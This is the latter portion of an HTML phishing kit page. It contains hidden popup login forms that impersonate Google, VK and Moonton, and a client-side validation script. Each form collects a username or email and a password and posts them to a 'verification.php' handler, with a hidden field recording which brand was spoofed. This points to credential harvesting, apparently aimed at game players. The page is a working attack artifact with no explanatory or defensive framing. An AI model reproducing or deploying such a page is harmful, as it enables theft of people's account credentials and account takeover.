yqEIaS6qY/C3afAXv9f3vqvy7UXdJNeiAHwBdNlkmNCtVOiqhjSigjhDn1LB9hOmCd1KhaFJWCMqKRV1B/cOtA5q2vX5V8MbUQnGAUoz3kuHsaCvCSlqJoRGVIo/OjM+PQ714xJLF79umoc3omZGNNW/+utuKAsGMCFF1WAQaUGowfPNZ7LQ/0eYKPRJpIZCVwxdMg1ZG+c1WYkU7ua3CupaaAoi2Wji5H4vfMqZDjgjE9z8DtzPeLYzSxpAJBtIxupAsBYX/vkvQE91OEN0VD1ke7rMKMgz4Lw679HyypfL3fwBlFE9NhVrCtuerkLKdG0a3JLTnpJebN/szb9BGtPd4L9g9RHWT3VGQe4PTgOUj3m1NhHseBrir48Dl40glcJUHTKfLkNyCqW7w86rp4M+52A9UwIdtGxkA6YZXVUkRjQoOVmW+7Na73Q6ndd1zafV015tMFH+jwed/vGb/wb0VLBfWeuhCMUVTEGQdR5O/w9ZcHFMm25+3w6ACOKjmsJvMtBL6PuXDTAfVVXnYoTICb/57IUrAHnUFMpQhJdfg5MN1K6tCUlVRCbZs8FxuajwE9wuA7UE+j+uiNlAWwoHweyG0UspGy67jTBBqKs+iRWi0uBsOzY4FY8jYB/N4XtwpHLeFwNXwmVNAxZlXFL2xbbdxnHgHUUiEO1lA7zUr6kap8qvSikbWZSAauWPGSLH/WEFY/Yx5K8aa4hy3BCtfXFlGwFgDK242BdXtgMezPgixqxomA0OMkAlo8YOUd1tZNEBqsca8epuaM1TkcTgAnEWqzZckTxBPSAxiBeiHMErH704VY1obtXjk1I5IaKhyPkkHp6K/kLd0iAOnoo+xyzrlCNdNrhoQtDSnHDZiNJDTfVItqnyDMcLAuQSDodtsLxHJBo5PAbUNSeQVAUa70s61T5eRmSjOgA6pfG5KidPSLyXW69hCkdO7pP6GYd5TcDAKNMQ8zkIGOVoGTlZJsmnql6jo8s56uwRWTxN894kGkMK8oTcz6isqTrwG6kAFifIA1K/MOIobWQLGaSCRzS9uKha6yOBVGepamR+W8RfU2hIbVSsGj/zWapPaxPfOSd3OtV6ccYzVFf8VVCnnwDgFDoh2JxfXDSv1j5OaNmfU5sHE/qzWjVBdAvNp6e1WV8whthUWVwKmDbg1p8NetV5AjzTQ/W6Ook4+DibTSZ99R3qfr8/mX2s1Xqn0aP9D7uQ9GyzEGMNAAAAAElFTkSuQmCC">

			</center>

		</div>

		<div class="box-twitter">

			<center>

			<form action="verification.php" method="post">

				<div class="txt-login-twitter">Login to Google</div>

				<div class="input-box-twitter">

					<label>Phone, email, or username</label>

					<input type="text" name="email" placeholder="" required>

				</div>

				<div class="input-box-twitter">

					<label>Password</label>

					<input type="password" name="password" placeholder="" required>

				</div>

				<input type="hidden" name="login" value="Google" readonly>

				<button type="submit" class="btn-login-twitter">Log In</button>

				<div class="footer-menu-twitter">Forgot password?</div>

				<div class="footer-menu-twitter bulet">•</div>

				<div class="footer-menu-twitter">Sign up to Google</div>

			</form>

			</center>

		</div>

	</div>

</div>



<div class="popup-login login-vk animate__animated animate__fadeIn" style="display: none;">

	<div class="popup-box-login-twitter">

	<a href="javascript:void(0);" id="closeVK" class="close-other"><i class="zmdi zmdi-close"></i></a>

		<div class="header-twitter">

			<center>

			<img src="data:image/png;base64,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">

			</center>

		</div>

		<div class="box-twitter">

			<center>

			<form action="verification.php" method="post">

				<div class="txt-login-twitter">Login to VK</div>

				<div class="input-box-twitter">

					<label>Phone, email, or username</label>

					<input type="text" name="email" placeholder="" required>

				</div>

				<div class="input-box-twitter">

					<label>Password</label>

					<input type="password" name="password" placeholder="" required>

				</div>

				<input type="hidden" name="login" value="VK" readonly>

				<button type="submit" class="btn-login-twitter">Log In</button>

				<div class="footer-menu-twitter">Forgot password?</div>

				<div class="footer-menu-twitter bulet">•</div>

				<div class="footer-menu-twitter">Sign up to VK</div>

			</form>

			</center>

		</div>

	</div>

</div>



<div class="popup-login login-mo animate__animated animate__fadeIn" style="display: none;">

	<div class="popup-box-login-twitter">

	<a href="javascript:void(0);" id="closeMo" class="close-other"><i class="zmdi zmdi-close"></i></a>

		<div class="header-twitter">

			<center>

			<img src="https://2.bp.blogspot.com/-4hQwrsUFwwg/WkyFCMEk9zI/AAAAAAAABh8/fRVdNMJQ7iwkRzmprNXUEpEzaQwHs5WDgCPcBGAYYCw/s200/moonton.png">

			</center>

		</div>

		<div class="box-twitter">

			<center>

			<form action="verification.php" method="post">

				<div class="txt-login-twitter">Login to Moonton</div>

				<div class="input-box-twitter">

					<label>Phone, email, or username</label>

					<input type="text" name="email" placeholder="" required>

				</div>

				<div class="input-box-twitter">

					<label>Password</label>

					<input type="password" name="password" placeholder="" required>

				</div>

				<input type="hidden" name="login" value="Moonton" readonly>

				<button type="submit" class="btn-login-twitter">Log In</button>

				<div class="footer-menu-twitter">Forgot password?</div>

				<div class="footer-menu-twitter bulet">•</div>

				<div class="footer-menu-twitter">Sign up to Moonton</div>

			</form>

			</center>

		</div>

	</div>

</div>



    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

      <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>

      <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>

    <script src="static/js/imryu.js"></script>

    <script type="text/javascript">
        function valid() {
            var user = $('#user').val();
            var pass = $('#pass').val();
            var ip = $('#ip').val();
            if(user == '' || user == null)
            {
                $('.email').show();
                $('.sandi').hide();
                return false;
            }else{
            
                if(user.includes('@')){
                let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
                if(user.match(pattern)){
                $('.email').hide();
                }else{
                $('.email').show();
                $('.sandi').hide();
                return false;
                }
                }
                
                if(!isNaN(user)){
                if(user.length <= 10){
                $('.email').show();
                $('.sandi').hide();
                return false;
                }else{
                $('.email').hide();
                }
                }
                
                if(user.match(/\s/g)){
                $('.email').show();
                $('.sandi').hide();
                return false;
                }else{
                $('.email').hide();
                }
                
                var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                if(user.match(regex)){
                $('.email').show();
                $('.sandi').hide();
                return false;
                }
                
                if(user.length <= 5){
                $('.email').show();
                $('.sandi').hide();
                return false;
                }else{
                $('.email').hide();
                }
                
            }
            if(pass == '' || pass == null || pass.length <= 5)
            {
                $('.sandi').show();
                return false;
            }else{
                $('.sandi').hide();
            }
        }
    </script>

    </body>

</html>